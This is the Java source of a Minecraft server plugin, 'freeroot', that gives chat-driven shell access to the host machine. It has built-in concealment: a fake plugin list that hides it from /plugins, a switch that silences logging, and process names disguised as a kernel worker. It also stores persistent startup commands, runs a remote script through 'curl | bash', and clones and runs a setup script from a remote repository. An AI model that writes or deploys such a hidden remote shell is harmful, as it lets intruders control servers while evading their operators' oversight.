//Make by mytai
//My repo(https://github.com/Mytai20100/freeroot-jar)
//Version v1.6
package org;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class freeroot extends JavaPlugin implements Listener {

    private final List<String> lastLogs = new ArrayList<>();
    private volatile boolean isInitializing = false;
    private volatile boolean isInitialized = false;
    private volatile boolean consoleLogging = true;
    private volatile boolean alwaysMode = false;
    private volatile boolean pluginHidden = false;
    private File configFile;
    private FileConfiguration config;
    private final ConcurrentHashMap<String, String> userWorkingDir = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, ProcessBuilder> userEnvironment = new ConcurrentHashMap<>();
    private List<String> startupCommands = new ArrayList<>();
    private final List<String> fakePlugins = Arrays.asList(
            "Essentials", "WorldEdit", "Vault", "LuckPerms", "PlaceholderAPI"
    );
    private static final String PLUGIN_VERSION = "v1.6-SNAPSHOT";
    private static final String PLUGIN_AUTHOR = "mytai";
    private static final String PLUGIN_REPO = "https://github.com/Mytai20100/freeroot-jar";

    @Override
    public void onEnable() {
        try {
            loadConfig();
            consoleLogging = config.getBoolean("console-logging", true);
            alwaysMode = config.getBoolean("always-mode", false);
            pluginHidden = config.getBoolean("plugin-hidden", false);
            startupCommands = config.getStringList("startup-commands");
            getServer().getPluginManager().registerEvents(this, this);
            if (!pluginHidden) {
                getLogger().info(colorize("&a[*] Freeroot Plugin v" + PLUGIN_VERSION + " Enabled!"));
            }
            if (!startupCommands.isEmpty()) {
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        executeStartupCommands();
                    }
                }.runTaskLater(this, 40L);
            }

        } catch (Exception e) {
            if (!pluginHidden) {
                getLogger().severe("Failed to enable plugin: " + e.getMessage());
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onDisable() {
        try {
            saveConfig();
            if (!pluginHidden) {
                getLogger().info(colorize("&c[*] Freeroot Plugin Disabled."));
            }
        } catch (Exception e) {
            if (!pluginHidden) {
                getLogger().severe("Error during disable: " + e.getMessage());
            }
        }
    }

    private void loadConfig() {
        try {
            configFile = new File(getDataFolder(), "config.yml");

            if (!configFile.exists()) {
                getDataFolder().mkdirs();
                configFile.createNewFile();
            }
            config = YamlConfiguration.loadConfiguration(configFile);
            if (!config.contains("console-logging")) {
                config.set("console-logging", true);
            }
            if (!config.contains("always-mode")) {
                config.set("always-mode", false);
            }
            if (!config.contains("plugin-hidden")) {
                config.set("plugin-hidden", false);
            }
            if (!config.contains("startup-commands")) {
                config.set("startup-commands", new ArrayList<String>());
            }
            saveConfigFile();
        } catch (Exception e) {
            getLogger().severe("Failed to load config: " + e.getMessage());
        }
    }
    private void saveConfigFile() {
        try {
            config.save(configFile);
        } catch (IOException e) {
            getLogger().severe("Could not save config file: " + e.getMessage());
        }
    }

    private void executeStartupCommands() {
        if (!pluginHidden && consoleLogging) {
            getLogger().info(colorize("&e[*] Executing startup commands..."));
        }

        new BukkitRunnable() {
            @Override
            public void run() {
                for (String command : startupCommands) {
                    if (!pluginHidden && consoleLogging) {
                        getLogger().info(colorize("&7[STARTUP] Executing: &f" + command));
                    }
                    executeCommand(null, command, "STARTUP_USER");

                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
                if (!pluginHidden && consoleLogging) {
                    getLogger().info(colorize("&a[+] All startup commands completed!"));
                }
            }
        }.runTaskAsynchronously(this);
    }

    private String colorize(String message) {
        return ChatColor.translateAlternateColorCodes('&', message);
    }

    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        if (!alwaysMode) return;

        String message = event.getMessage();
        String[] parts = message.split(" ", 2);
        String cmd = parts[0].toLowerCase();

        if ((cmd.equals("/r") || cmd.equals("/rt")) && parts.length > 1) {
            String firstArg = parts[1].toLowerCase().trim();
            if (firstArg.equals("-on") || firstArg.equals("-off") ||
                    firstArg.equals("log") || firstArg.equals("pwd") ||
                    firstArg.equals("reset") || firstArg.equals("version") ||
                    firstArg.equals("disable-log") || firstArg.equals("enable-log") ||
                    firstArg.equals("disable-pl") || firstArg.equals("enable-pl") ||
                    firstArg.startsWith("startup")) {
                return; 
            }
        }

        if (cmd.equals("/root") || cmd.equals("/r") || cmd.equals("/rt") ||
                cmd.equals("/neofetch") || cmd.equals("/info") ||
                cmd.startsWith("/minecraft:") || cmd.startsWith("/bukkit:")) {
            return;
        }

        if (getServer().getPluginCommand(cmd.substring(1)) != null) {
            return;
        }

        event.setCancelled(true);
        String shellCmd = message.substring(1);
        event.getPlayer().sendMessage(colorize("&e[Always Mode] &7Executing: &f" + shellCmd));

        new BukkitRunnable() {
            @Override
            public void run() {
                executeCommand(event.getPlayer(), shellCmd, event.getPlayer().getName());
            }
        }.runTaskAsynchronously(this);
    }

    @EventHandler
    public void onServerCommand(ServerCommandEvent event) {
        String cmd = event.getCommand().toLowerCase().trim();
        if (pluginHidden) {
            if (cmd.equals("plugins") || cmd.equals("pl") ||
                    cmd.equals("bukkit:plugins") || cmd.equals("bukkit:pl")) {
                event.setCancelled(true);
                CommandSender sender = event.getSender();
                sender.sendMessage(colorize("&aPlugins (&f" + fakePlugins.size() + "&a): &f" +
                        String.join(", ", fakePlugins)));
                return;
            }
        }
        if (alwaysMode) {
            String fullCmd = event.getCommand().trim();
            String[] parts = fullCmd.split(" ", 2);
            String baseCmd = parts[0].toLowerCase();
            if (baseCmd.equals("root") || baseCmd.equals("r") || baseCmd.equals("rt") ||
                    baseCmd.equals("neofetch") || baseCmd.equals("info") ||
                    baseCmd.startsWith("minecraft:") || baseCmd.startsWith("bukkit:")) {
                return;
            }
            if (getServer().getPluginCommand(baseCmd) != null) {
                return;
            }
            event.setCancelled(true);
            CommandSender sender = event.getSender();
            sender.sendMessage(colorize("&e[Always Mode] &7Executing: &f" + fullCmd));

            new BukkitRunnable() {
                @Override
                public void run() {
                    executeCommand(sender, fullCmd, "CONSOLE");
                }
            }.runTaskAsynchronously(this);
        }
    }
    @EventHandler
    public void onPlayerPluginCommand(PlayerCommandPreprocessEvent event) {
        if (!pluginHidden) return;
        String message = event.getMessage().toLowerCase().trim();
        if (message.equals("/plugins") || message.equals("/pl") ||
                message.equals("/bukkit:plugins") || message.equals("/bukkit:pl")) {
            event.setCancelled(true);
            event.getPlayer().sendMessage(colorize("&aPlugins (&f" + fakePlugins.size() + "&a): &f" +
                    String.join(", ", fakePlugins)));
        }
    }
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        String cmdName = cmd.getName().toLowerCase();
        if (cmdName.equals("neofetch")) {
            if (!pluginHidden && consoleLogging) {
                sender.sendMessage(colorize("&e[*] Running Neofetch..."));
            }
            new BukkitRunnable() {
                @Override
                public void run() {
                    executeCommand(sender, "curl -s https://raw.githubusercontent.com/dylanaraps/neofetch/master/neofetch | bash", sender.getName());
                }
            }.runTaskAsynchronously(this);
            return true;
        }

        // Handle /info command
        if (cmdName.equals("info")) {
            if (!pluginHidden && consoleLogging) {
                sender.sendMessage(colorize("&e[*]System information..."));
            }
            new BukkitRunnable() {
                @Override
                public void run() {
                    displaySystemInfo(sender);
                }
            }.runTaskAsynchronously(this);
            return true;
        }

        if (cmdName.equals("root") || cmdName.equals("r") || cmdName.equals("rt")) {
            String senderKey = sender.getName();

            if (args.length == 0) {
                sender.sendMessage(colorize("&c┌─ &lFreeroot Plugin Commands &c─┐"));
                sender.sendMessage(colorize("&7│ &f/root <command>       &7- Execute command"));
                sender.sendMessage(colorize("&7│ &f/root log            &7- View last logs"));
                sender.sendMessage(colorize("&7│ &f/root pwd            &7- Show current dir"));
                sender.sendMessage(colorize("&7│ &f/root reset          &7- Reset session"));
                sender.sendMessage(colorize("&7│ &f/root version        &7- Plugin version"));
                sender.sendMessage(colorize("&7│ &f/root -on/-off       &7- Toggle always mode // it iss errror =))"));
                sender.sendMessage(colorize("&7│ &f/root disable-log    &7- Disable logging"));
                sender.sendMessage(colorize("&7│ &f/root enable-log     &7- Enable logging"));
                sender.sendMessage(colorize("&7│ &f/root disable-pl     &7- Hide plugin"));
                sender.sendMessage(colorize("&7│ &f/root enable-pl      &7- Show plugin"));
                sender.sendMessage(colorize("&7│ &f/root startup <cmd>  &7- Add startup command"));
                sender.sendMessage(colorize("&7│ &f/root startup list   &7- List startup commands"));
                sender.sendMessage(colorize("&7│ &f/root startup clear  &7- Clear startup commands"));
                sender.sendMessage(colorize("&7│ &f/neofetch            &7- Run neofetch"));
                sender.sendMessage(colorize("&7│ &f/info                &7- System information"));
                sender.sendMessage(colorize("&7│ &aAliases: /r, /rt"));
                sender.sendMessage(colorize("&c└─────────────────────────────┘"));
                return true;
            }

            String firstArg = args[0].toLowerCase();

            if (firstArg.equals("-on")) {
                alwaysMode = true;
                config.set("always-mode", true);
                saveConfigFile();
                sender.sendMessage(colorize("&a[+] Always Mode &aENABLED&a!"));
                sender.sendMessage(colorize("&7    All commands will be executed as shell commands."));
                sender.sendMessage(colorize("&7    Use &f/root -off &7to disable."));
                return true;
            }
            if (firstArg.equals("-off")) {
                alwaysMode = false;
                config.set("always-mode", false);
                saveConfigFile();
                sender.sendMessage(colorize("&c[+] Always Mode &cDISABLED&c!"));
                sender.sendMessage(colorize("&7    Commands require &f/root &7prefix again."));
                return true;
            }

            if (firstArg.equals("disable-pl")) {
                pluginHidden = true;
                consoleLogging = false;
                config.set("plugin-hidden", true);
                config.set("console-logging", false);
                saveConfigFile();
                sender.sendMessage(colorize("&a[+] Plugin is now &cHIDDEN&a!"));
                sender.sendMessage(colorize("&7    Plugin will not appear in /pl or /plugins"));
                sender.sendMessage(colorize("&7    All logging is disabled."));
                sender.sendMessage(colorize("&7    Use &f/root enable-pl &7to unhide."));
                return true;
            }
            if (firstArg.equals("enable-pl")) {
                pluginHidden = false;
                config.set("plugin-hidden", false);
                saveConfigFile();
                sender.sendMessage(colorize("&a[+] Plugin is now &aVISIBLE&a!"));
                sender.sendMessage(colorize("&7    Plugin will appear in /pl or /plugins"));
                sender.sendMessage(colorize("&7    Use &f/root enable-log &7to enable logging."));
                return true;
            }
            if (firstArg.equals("startup")) {
                if (args.length == 1) {
                    sender.sendMessage(colorize("&e┌─ Startup Command Usage ─┐"));
                    sender.sendMessage(colorize("&7│ &f/root startup <command> &7- Add"));
                    sender.sendMessage(colorize("&7│ &f/root startup list     &7- List"));
                    sender.sendMessage(colorize("&7│ &f/root startup clear    &7- Clear all"));
                    sender.sendMessage(colorize("&e└─────────────────────────┘"));
                    return true;
                }

                if (args[1].equalsIgnoreCase("list")) {
                    if (startupCommands.isEmpty()) {
                        sender.sendMessage(colorize("&7[!] No startup commands configured."));
                    } else {
                        sender.sendMessage(colorize("&e┌─ Startup Commands ─┐"));
                        for (int i = 0; i < startupCommands.size(); i++) {
                            sender.sendMessage(colorize("&7│ &f" + (i + 1) + ". &a" + startupCommands.get(i)));
                        }
                        sender.sendMessage(colorize("&e└───────────────────┘"));
                    }
                    return true;
                }
                if (args[1].equalsIgnoreCase("clear")) {
                    startupCommands.clear();
                    config.set("startup-commands", startupCommands);
                    saveConfigFile();
                    sender.sendMessage(colorize("&a[+] All startup commands cleared!"));
                    return true;
                }
                String startupCmd = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
                startupCommands.add(startupCmd);
                config.set("startup-commands", startupCommands);
                saveConfigFile();
                sender.sendMessage(colorize("&a[+] Added startup command: &f" + startupCmd));
                sender.sendMessage(colorize("&7    Total startup commands: &e" + startupCommands.size()));
                return true;
            }

            if (args.length == 1) {
                if (firstArg.equals("log")) {
                    if (lastLogs.isEmpty()) {
                        sender.sendMessage(colorize("&7[!] No logs available."));
                    } else {
                        sender.sendMessage(colorize("&9┌─ &lLast Command Logs &9─┐"));
                        String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));
                        sender.sendMessage(colorize("&6│ PWD: &f" + currentDir));
                        sender.sendMessage(colorize("&9├─────────────────────────┤"));
                        for (String line : lastLogs) {
                            if (line.startsWith(">>>")) {
                                sender.sendMessage(colorize("&b│ " + line));
                            } else if (line.contains("Exit Code: 0")) {
                                sender.sendMessage(colorize("&a│ " + line));
                            } else if (line.contains("Exit Code:") && !line.contains("Exit Code: 0")) {
                                sender.sendMessage(colorize("&c│ " + line));
                            } else if (line.contains("ERROR")) {
                                sender.sendMessage(colorize("&4│ " + line));
                            } else {
                                sender.sendMessage(colorize("&8│ " + line));
                            }
                        }
                        sender.sendMessage(colorize("&9└─────────────────────────┘"));
                    }
                    return true;
                }
                if (firstArg.equals("pwd")) {
                    String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));
                    sender.sendMessage(colorize("&e┌─ Current Directory ─┐"));
                    sender.sendMessage(colorize("&6│ " + currentDir));
                    sender.sendMessage(colorize("&e└─────────────────────┘"));
                    return true;
                }
                if (firstArg.equals("reset")) {
                    userWorkingDir.remove(senderKey);
                    userEnvironment.remove(senderKey);
                    sender.sendMessage(colorize("&a[+] Session reset! Back to root directory."));
                    return true;
                }
                if (firstArg.equals("version")) {
                    sender.sendMessage(colorize("&d┌─ &lFreeroot Plugin Info &d─┐"));
                    sender.sendMessage(colorize("&7│ &fVersion: &e" + PLUGIN_VERSION));
                    sender.sendMessage(colorize("&7│ &fAuthor: &b" + PLUGIN_AUTHOR));
                    sender.sendMessage(colorize("&7│ &fRepository:"));
                    sender.sendMessage(colorize("&7│   &9" + PLUGIN_REPO));
                    sender.sendMessage(colorize("&7│ &fFeatures:"));
                    sender.sendMessage(colorize("&7│   &a✓ &7Startup Commands"));
                    sender.sendMessage(colorize("&7│   &a✓ &7Plugin Hide"));
                    sender.sendMessage(colorize("&7│   &a✓ &7Proot Integration"));
                    sender.sendMessage(colorize("&7│   &a✓ &7Root Privileges (via proot)"));

                    File prootBin = new File(System.getProperty("user.dir"), ".cache/minecraft/work/usr/local/bin/proot");
                    if (prootBin.exists()) {
                        sender.sendMessage(colorize("&7│ &fProot: &aEnabled &7(found at work dir)"));
                    } else {
                        sender.sendMessage(colorize("&7│ &fProot: &cNot found &7(normal execution)"));
                    }

                    sender.sendMessage(colorize("&d└─────────────────────────┘"));
                    return true;
                }
                if (firstArg.equals("disable-log")) {
                    consoleLogging = false;
                    config.set("console-logging", false);
                    saveConfigFile();
                    sender.sendMessage(colorize("&a[+] Console logging &cdisabled&a!"));
                    sender.sendMessage(colorize("&7    Commands will run silently in background."));
                    return true;
                }
                if (firstArg.equals("enable-log")) {
                    consoleLogging = true;
                    config.set("console-logging", true);
                    saveConfigFile();
                    sender.sendMessage(colorize("&a[+] Console logging &aenabled&a!"));
                    sender.sendMessage(colorize("&7    Command output will be shown in console."));
                    return true;
                }
            }
            String fullCommand = String.join(" ", args);
            if (consoleLogging && !pluginHidden) {
                sender.sendMessage(colorize("&e[*] &7Executing: &f" + fullCommand));
                sender.sendMessage(colorize("&8    Status: &7Processing..."));
            }
            new BukkitRunnable() {
                @Override
                public void run() {
                    executeCommand(sender, fullCommand, senderKey);
                }
            }.runTaskAsynchronously(this);

            return true;
        }
        return false;
    }
    private void displaySystemInfo(CommandSender sender) {
        sender.sendMessage(colorize("&b┌─ &lSystem Information &b─┐"));

        try {
            OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
            Runtime runtime = Runtime.getRuntime();

            // OS Info
            sender.sendMessage(colorize("&7│ &fOS: &a" + System.getProperty("os.name")));
            sender.sendMessage(colorize("&7│ &fArch: &a" + System.getProperty("os.arch")));
            sender.sendMessage(colorize("&7│ &fVersion: &a" + System.getProperty("os.version")));

            // Java Info
            sender.sendMessage(colorize("&7│ &fJava: &a" + System.getProperty("java.version")));

            // CPU Info - Chi tiết
            String cpuInfo = getCPUInfo();
            sender.sendMessage(colorize("&7│ &fCPU: &a" + cpuInfo));
            sender.sendMessage(colorize("&7│ &fLoad Avg: &a" + String.format("%.2f", osBean.getSystemLoadAverage())));

            // Memory Info
            long maxMemory = runtime.maxMemory() / (1024 * 1024);
            long totalMemory = runtime.totalMemory() / (1024 * 1024);
            long freeMemory = runtime.freeMemory() / (1024 * 1024);
            long usedMemory = totalMemory - freeMemory;

            sender.sendMessage(colorize("&7│ &fMemory Used: &a" + usedMemory + "MB &7/ &a" + maxMemory + "MB"));

            // Working Directory
            sender.sendMessage(colorize("&7│ &fWorking Dir: &a" + System.getProperty("user.dir")));

            // Public IP
            String publicIP = getPublicIP();
            sender.sendMessage(colorize("&7│ &fPublic IP: &a" + publicIP));

            sender.sendMessage(colorize("&b└─────────────────────────┘"));

        } catch (Exception e) {
            sender.sendMessage(colorize("&c[!] Failed to retrieve system info: " + e.getMessage()));
        }
    }

    private String getCPUInfo() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String cpuName = "Unknown";
            int cores = Runtime.getRuntime().availableProcessors();
            String frequency = "";

            if (os.contains("win")) {
                // Windows
                Process process = Runtime.getRuntime().exec("wmic cpu get name");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (!line.trim().isEmpty() && !line.contains("Name")) {
                        cpuName = line.trim();
                        break;
                    }
                }
                reader.close();
            } else if (os.contains("linux")) {
                // Linux
                Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.startsWith("model name")) {
                        cpuName = line.split(":")[1].trim();
                        break;
                    }
                }
                reader.close();
            } else if (os.contains("mac")) {
                // macOS
                Process process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                cpuName = reader.readLine().trim();
                reader.close();
            }
            if (cpuName.matches(".*\\d+\\.\\d+\\s*[GM]Hz.*")) {
                return cpuName + " (" + cores + " cores)";
            } else {
                return cpuName + " (" + cores + " cores)";
            }

        } catch (Exception e) {
            int cores = Runtime.getRuntime().availableProcessors();
            return "Unknown (" + cores + " cores)";
        }
    }

    private String getPublicIP() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();

            return ip != null ? ip : "Unknown";
        } catch (Exception e) {
            return "Unable to fetch";
        }
    }

    private void executeCommand(CommandSender sender, String command, String senderKey) {
        lastLogs.clear();

        try {
            ensureBasicSetup();

            String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));

            if (command.trim().startsWith("cd ")) {
                handleCdCommand(command, senderKey, currentDir, sender);
                return;
            }

            if (consoleLogging && !pluginHidden) {
                getLogger().info(colorize("&e[*] Running command: &f" + command + " &7in directory: &f" + currentDir));
            }

            // Check if proot environment exists
            File prootDir = new File(System.getProperty("user.dir"), ".cache/minecraft/work");
            File prootBin = new File(prootDir, "usr/local/bin/proot");

            String finalCommand;
            if (prootBin.exists() && prootBin.canExecute()) {
                // Run command inside proot environment with root privileges
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[*] Executing in proot environment with root privileges"));
                }

                String escapedCmd = command.replace("\"", "\\\"").replace("\\", "\\\\");
                String prootCmd = prootBin.getAbsolutePath() +
                        " --rootfs=\"" + prootDir.getAbsolutePath() + "\"" +
                        " -0" +
                        " -w \"/root\"" +
                        " -b /dev" +
                        " -b /sys" +
                        " -b /proc" +
                        " -b /etc/resolv.conf" +
                        " --kill-on-exit" +
                        " /bin/bash -c \"" + escapedCmd + "\"";

                finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(prootCmd);
            } else {
                // Fallback to normal execution
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&e[*] Proot not found, executing normally"));
                }
                finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(command);
            }

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", finalCommand);
            pb.redirectErrorStream(true);
            pb.directory(new File(currentDir));

            if (userEnvironment.containsKey(senderKey)) {
                ProcessBuilder savedEnv = userEnvironment.get(senderKey);
                pb.environment().putAll(savedEnv.environment());
            }

            Process process = pb.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;

            lastLogs.add(">>> [" + currentDir + "] $ " + command);
            lastLogs.add("");

            boolean hasOutput = false;
            while ((line = reader.readLine()) != null) {
                hasOutput = true;
                String cleanLine = line.replaceAll("\\x1B\\[[0-9;]*[mGKHF]", "");
                lastLogs.add(cleanLine);

                if (consoleLogging && !pluginHidden) {
                    getLogger().info("[CMD OUTPUT] " + cleanLine);
                }
            }

            if (!hasOutput) {
                lastLogs.add("(no output)");
            }

            int exitCode = process.waitFor();
            lastLogs.add("");
            lastLogs.add(">>> Exit Code: " + exitCode);

            reader.close();
            userEnvironment.put(senderKey, pb);

            if (sender != null) {
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        if (exitCode == 0) {
                            sender.sendMessage(colorize("&a[+] Command completed successfully!"));
                            if (consoleLogging && !pluginHidden) {
                                sender.sendMessage(colorize("&7    Use &f/root log &7to view output."));
                            }
                        } else {
                            sender.sendMessage(colorize("&c[!] Command completed with errors &7(code: &c" + exitCode + "&7)"));
                            if (consoleLogging && !pluginHidden) {
                                sender.sendMessage(colorize("&7    Use &f/root log &7to view details."));
                            }
                        }
                    }
                }.runTask(this);
            }

        } catch (Exception e) {
            handleCommandError(sender, command, e);
        }
    }

    private void handleCdCommand(String command, String senderKey, String currentDir, CommandSender sender) {
        try {
            String targetDir = command.substring(3).trim();
            if (targetDir.isEmpty()) {
                targetDir = System.getProperty("user.home");
            }

            File newDir;
            if (targetDir.startsWith("/")) {
                newDir = new File(targetDir);
            } else {
                newDir = new File(currentDir, targetDir);
            }

            String newPath = newDir.getCanonicalPath();
            final String finalTargetDir = targetDir;

            if (newDir.exists() && newDir.isDirectory()) {
                userWorkingDir.put(senderKey, newPath);

                lastLogs.clear();
                lastLogs.add(">>> [" + currentDir + "] $ " + command);
                lastLogs.add("");
                lastLogs.add("Changed directory to: " + newPath);
                lastLogs.add("");
                lastLogs.add(">>> Exit Code: 0");

                if (sender != null) {
                    final String finalNewPath = newPath;
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            sender.sendMessage(colorize("&a[+] Changed to directory: &f" + finalNewPath));
                        }
                    }.runTask(this);
                }

                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[+] Changed to directory: &f" + newPath));
                }

            } else {
                lastLogs.clear();
                lastLogs.add(">>> [" + currentDir + "] $ " + command);
                lastLogs.add("");
                lastLogs.add("bash: cd: " + finalTargetDir + ": No such file or directory");
                lastLogs.add("");
                lastLogs.add(">>> Exit Code: 1");

                if (sender != null) {
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            sender.sendMessage(colorize("&c[!] Directory not found: &f" + finalTargetDir));
                        }
                    }.runTask(this);
                }

                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&c[!] Directory not found: &f" + finalTargetDir));
                }
            }

        } catch (Exception e) {
            handleCommandError(sender, command, e);
        }
    }

    private void handleCommandError(CommandSender sender, String command, Exception e) {
        lastLogs.clear();
        lastLogs.add(">>> ERROR executing command: " + command);
        lastLogs.add(">>> Exception: " + e.getClass().getSimpleName());
        lastLogs.add(">>> Message: " + e.getMessage());

        if (consoleLogging && !pluginHidden) {
            getLogger().severe("Error executing command '" + command + "': " + e.getMessage());
            e.printStackTrace();
        }

        if (sender != null) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    sender.sendMessage(colorize("&c[!] Command failed! Use &f/root log &cto view error details."));
                }
            }.runTask(this);
        }
    }
    private static final String CACHE_DIR = ".cache/minecraft";
    private static final String WORK_DIR = CACHE_DIR + "/work";
    private static final String PROOT_BIN = WORK_DIR + "/usr/local/bin/proot";

    private void ensureBasicSetup() {
        if (isInitialized || isInitializing) {
            return;
        }
        synchronized (this) {
            if (isInitialized || isInitializing) {
                return;
            }
            isInitializing = true;
        }
        try {
            File cacheDir = new File(System.getProperty("user.dir"), CACHE_DIR);
            File workDir = new File(System.getProperty("user.dir"), WORK_DIR);
            File prootBin = new File(System.getProperty("user.dir"), PROOT_BIN);
            if (workDir.exists() && prootBin.exists() && prootBin.canExecute()) {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[+] Proot environment already exists!"));
                }
                isInitialized = true;
                return;
            }
            if (!cacheDir.exists()) {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&e[*] Creating cache directory..."));
                }
                cacheDir.mkdirs();
            }

            if (consoleLogging && !pluginHidden) {
                getLogger().info(colorize("&e[*] Setting up proot environment..."));
                getLogger().info(colorize("&7    This may take a few minutes..."));
            }
            String tempDir = CACHE_DIR + "/freeroot_temp";
            ProcessBuilder cloneProcess = new ProcessBuilder(
                    "bash", "-c",
                    "cd " + escapeForShell(cacheDir.getAbsolutePath()) + " && " +
                            "git clone https://github.com/Mytai20100/freeroot.git freeroot_temp"
            );
            cloneProcess.redirectErrorStream(true);
            Process clone = cloneProcess.start();

            BufferedReader cloneReader = new BufferedReader(new InputStreamReader(clone.getInputStream()));
            String line;
            while ((line = cloneReader.readLine()) != null) {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info("[SETUP] " + line);
                }
            }
            clone.waitFor();
            cloneReader.close();
            File tempDirFile = new File(System.getProperty("user.dir"), tempDir);
            if (tempDirFile.exists()) {
                if (workDir.exists()) {
                    deleteDirectory(workDir);
                }
                tempDirFile.renameTo(workDir);

                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[+] Repository cloned and renamed to 'work'"));
                }
            }
            File noninteractiveScript = new File(workDir, "noninteractive.sh");
            if (noninteractiveScript.exists()) {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&e[*] Running noninteractive.sh..."));
                }

                ProcessBuilder setupProcess = new ProcessBuilder(
                        "bash", "-c",
                        "cd " + escapeForShell(workDir.getAbsolutePath()) + " && " +
                                "chmod +x noninteractive.sh && " +
                                "./noninteractive.sh"
                );
                setupProcess.redirectErrorStream(true);
                Process setup = setupProcess.start();

                BufferedReader setupReader = new BufferedReader(new InputStreamReader(setup.getInputStream()));
                while ((line = setupReader.readLine()) != null) {
                    if (consoleLogging && !pluginHidden) {
                        getLogger().info("[SETUP] " + line);
                    }
                }
                setup.waitFor();
                setupReader.close();

                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[+] Proot environment setup completed!"));
                }
            }

            isInitialized = true;

        } catch (Exception e) {
            if (!pluginHidden) {
                getLogger().warning(colorize("&c[-] Setup failed: " + e.getMessage()));
                e.printStackTrace();
            }
        } finally {
            isInitializing = false;
        }
    }
    private void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    deleteDirectory(file);
                }
            }
        }
        dir.delete();
    }
    private String escapeForShell(String command) {
        return "'" + command.replace("'", "'\\''") + "'";
    }
}